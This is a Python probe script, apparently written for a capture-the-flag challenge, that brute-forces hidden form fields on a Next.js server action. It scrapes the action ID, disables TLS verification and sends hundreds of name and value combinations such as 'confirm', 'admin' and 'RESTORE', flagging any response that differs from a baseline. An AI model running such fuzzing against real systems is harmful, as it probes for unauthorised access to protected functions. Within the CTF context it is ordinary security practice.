#!/usr/bin/env python3
"""
probe28: recoveryAction с TEXTOVYMI FormData-полями (не file).
probe21 проверял file uploads — все одинаковые. Здесь — text-only fields.

В MPA-режиме (action-handler.ts:786) decodeAction биндит FormData через
.bind(null, formData). Action видит FormData. Если он его валидирует и
ищет конкретное поле/значение — увидим разницу в response (status, length, restored:true).

Baseline (text/x-component, len 16889) — action отрабатывает но возвращает тот же HTML.
Если поле/значение правильное → ожидаем разный length / restored:true / другой статус.
"""
import time
import urllib.request
import ssl
import re
import sys
import hashlib

URL = "https://funicular-gm2cxozn.alfactf.ru/"
ACTION_ID_FILE = "/tmp/funi.actionid"

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def get_action_id():
    try:
        with open(ACTION_ID_FILE) as f:
            aid = f.read().strip()
            if aid:
                return aid
    except Exception:
        pass
    # fetch from page
    req = urllib.request.Request(URL, headers={"User-Agent": "p28"})
    with urllib.request.urlopen(req, context=CTX, timeout=20) as resp:
        body = resp.read().decode("utf-8", "replace")
    m = re.search(r'\\"id\\":\\"([a-f0-9]{40,})\\"', body)
    if not m:
        raise RuntimeError("no action id")
    aid = m.group(1)
    with open(ACTION_ID_FILE, "w") as f:
        f.write(aid)
    return aid


ACTION_ID = get_action_id()
print(f"# action_id = {ACTION_ID}")


def post_multipart(fields):
    """fields: list of (name, value). Sends as multipart/form-data."""
    boundary = "----p28b" + str(time.time()).replace(".", "")
    parts = []
    for name, value in fields:
        parts.append(f"--{boundary}\r\n")
        parts.append(f'Content-Disposition: form-data; name="{name}"\r\n\r\n')
        parts.append(f"{value}\r\n")
    parts.append(f"--{boundary}--\r\n")
    body = "".join(parts).encode("utf-8")
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "User-Agent": "p28",
        "Accept": "text/x-component",
    }
    req = urllib.request.Request(URL, data=body, headers=headers, method="POST")
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=25) as resp:
            data = resp.read()
            return resp.status, time.time() - t0, len(data), dict(resp.headers), data
    except urllib.error.HTTPError as e:
        try:
            data = e.read()
        except Exception:
            data = b""
        return e.code, time.time() - t0, len(data), dict(e.headers), data
    except Exception as e:
        return None, time.time() - t0, 0, {}, repr(e).encode()


# Baseline — empty (just $ACTION_ID_<id>=)
print("\n## Baseline (no extra fields)")
st, dt, ln, hdr, body = post_multipart([(f"$ACTION_ID_{ACTION_ID}", "")])
sha = hashlib.sha256(body).hexdigest()[:16]
restored = b'"restored":true' in body
print(f"  [{st}] {dt:5.2f}s len={ln} sha={sha} restored={restored}")
BASELINE_LEN = ln
BASELINE_SHA = sha

# Test combinations. For each — send as text field WITH the action id field.
COMBOS = []

# Single fields: each field name with each likely value
NAMES = [
    "confirm", "confirmed", "code", "password", "pin", "signature", "hmac",
    "mode", "restore", "restored", "force", "from", "backup", "source",
    "op", "operation", "action", "target", "flag", "key", "secret",
    "nonce", "timestamp", "csrf", "token", "api_key", "auth", "role",
    "admin", "engineer", "operator", "consent", "agree", "yes",
    "packet", "workOrder", "terminal", "stage", "step", "phase",
    "snapshot", "manifest", "version", "v", "id", "name",
    "cmd", "command", "instruction", "method",
]

VALUES = [
    "true", "1", "yes", "ok", "confirm", "confirmed",
    "restore", "RESTORE", "RESET", "reset", "GO",
    "south-line.2026-03-27", "WO-17-04", "OP-3",
    "admin", "root", "engineer", "operator",
    "alfa", "alfactf", "funicular",
]

# Single name+value
for name in NAMES:
    for value in VALUES:
        COMBOS.append([(f"$ACTION_ID_{ACTION_ID}", ""), (name, value)])

# Plus a few special multi-field combos
SPECIAL = [
    [("confirm", "true"), ("code", "RESTORE")],
    [("packet", "south-line.2026-03-27"), ("workOrder", "WO-17-04"), ("terminal", "OP-3"), ("confirm", "true")],
    [("mode", "restore"), ("force", "true")],
    [("op", "restore"), ("packet", "south-line.2026-03-27")],
    [("snapshot", "south-line.2026-03-27"), ("restore", "true")],
    [("manifest", '{"v":1,"restore":true}')],
    [("packet", "south-line.2026-03-27"), ("workOrder", "WO-17-04"), ("terminal", "OP-3")],
]
for sp in SPECIAL:
    COMBOS.append([(f"$ACTION_ID_{ACTION_ID}", "")] + sp)

print(f"\n## {len(COMBOS)} combos to try (will throttle, expect long runtime)")

# We're going to be smart: only print interesting (non-baseline) results.
# Throttle: 0.4s between requests.
diffs = []
for i, combo in enumerate(COMBOS):
    st, dt, ln, hdr, body = post_multipart(combo)
    sha = hashlib.sha256(body).hexdigest()[:16]
    restored = b'"restored":true' in body
    diff_marker = ""
    if ln != BASELINE_LEN or sha != BASELINE_SHA or st != 200 or restored:
        diff_marker = " <DIFF>"
        diffs.append((i, combo, st, dt, ln, sha, restored, body[:300]))
    fields_repr = ", ".join(f"{n}={v[:20]}" for n, v in combo if not n.startswith("$ACTION"))
    if i % 50 == 0 or diff_marker:
        print(f"  [{i:4d}] [{st}] {dt:5.2f}s len={ln} sha={sha} restored={restored} :: {fields_repr}{diff_marker}")
    time.sleep(0.4)

print(f"\n## DIFFS found: {len(diffs)}")
for d in diffs:
    i, combo, st, dt, ln, sha, restored, prev = d
    fields_repr = ", ".join(f"{n}={v[:20]}" for n, v in combo if not n.startswith("$ACTION"))
    print(f"  [{i:4d}] [{st}] {dt:5.2f}s len={ln} sha={sha} restored={restored} :: {fields_repr}")
    print(f"    body[:300]={prev!r}")
